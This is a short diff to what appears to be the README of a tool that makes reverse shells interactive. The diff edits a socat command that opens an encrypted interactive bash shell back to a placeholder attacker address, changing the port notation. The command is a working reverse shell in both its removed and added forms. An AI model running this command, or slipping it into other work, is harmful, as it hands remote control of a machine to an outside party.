@@ -5,7 +5,7 @@ Spawn a pty in your reverse shell to automaticcaly make it interactive.
 
 Equivalent of:
 ```shell
-socat exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:[ATTACKER_IP]:443,verify=0
+socat exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:[ATTACKER_IP:PORT],verify=0
 ```
 
 **Why ?**
